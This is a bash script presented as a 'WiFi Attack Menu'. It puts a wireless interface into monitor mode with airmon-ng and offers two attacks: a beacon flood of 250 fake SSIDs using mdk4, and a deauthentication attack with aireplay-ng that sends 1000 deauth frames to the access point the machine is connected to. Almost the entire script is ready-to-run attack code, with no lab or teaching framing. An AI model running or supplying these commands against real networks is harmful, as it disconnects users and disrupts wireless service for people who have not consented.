#!/bin/bash

INTERFACE="wlan0"
MONITOR="wlan0mon"
TEMP_SSID_FILE="/tmp/fake_ssidlist.txt"

function cleanup() {
    echo -e "\n[*] Cleaning up..."
    sudo airmon-ng stop $MONITOR
    sudo systemctl start NetworkManager
    echo "[*] Monitor mode disabled and NetworkManager restarted."
    exit 0
}

# Catch CTRL+C
trap cleanup SIGINT

function enable_monitor() {
    echo "[*] Enabling monitor mode..."
    sudo airmon-ng check kill
    sudo airmon-ng start $INTERFACE
}

function generate_fake_ssidlist() {
    echo "[*] Generating 250 fake SSIDs..."
    > $TEMP_SSID_FILE
    while true; do
        RAND=$(tr -dc 'A-Z0-9' </dev/urandom | head -c 4)
        echo "ARCHKHERT-$RAND" >> $TEMP_SSID_FILE
        COUNT=$(wc -l < $TEMP_SSID_FILE)
        if [ "$COUNT" -ge 250 ]; then
            break
        fi
    done
}

function get_connected_bssid() {
    echo "[*] Detecting connected Wi-Fi..."
    CONN_INFO=$(iw dev $INTERFACE link)
    BSSID=$(echo "$CONN_INFO" | grep "Connected to" | awk '{print $3}')
    CHANNEL=$(iw dev $INTERFACE info | grep channel | awk '{print $2}')
    
    if [ -z "$BSSID" ]; then
        echo "[!] Not connected to any Wi-Fi network. Cannot perform deauth."
        exit 1
    fi

    echo "[*] Connected to BSSID: $BSSID on Channel: $CHANNEL"
}

function fake_ssid_flood() {
    enable_monitor
    generate_fake_ssidlist
    echo "[*] Starting fake SSID broadcast with mdk4..."
    sudo mdk4 $MONITOR b -f $TEMP_SSID_FILE -s 100 &
    PID=$!
    wait $PID
}

function deauth_connected_wifi() {
    get_connected_bssid
    enable_monitor
    echo "[*] Setting monitor to channel $CHANNEL..."
    sudo iwconfig $MONITOR channel $CHANNEL
    echo "[*] Starting deauth attack on $BSSID..."
    sudo aireplay-ng --deauth 1000 -a $BSSID $MONITOR &
    PID=$!
    wait $PID
}

clear
echo "==== WiFi Attack Menu ===="
echo "1. Broadcast 250 Fake SSIDs"
echo "2. Deauth Connected Wi-Fi Automatically"
echo "3. Exit"
read -p "Select option [1-3]: " OPTION

case $OPTION in
    1)
        fake_ssid_flood
        ;;
    2)
        deauth_connected_wifi
        ;;
    3)
        cleanup
        ;;
    *)
        echo "Invalid option."
        ;;
esac
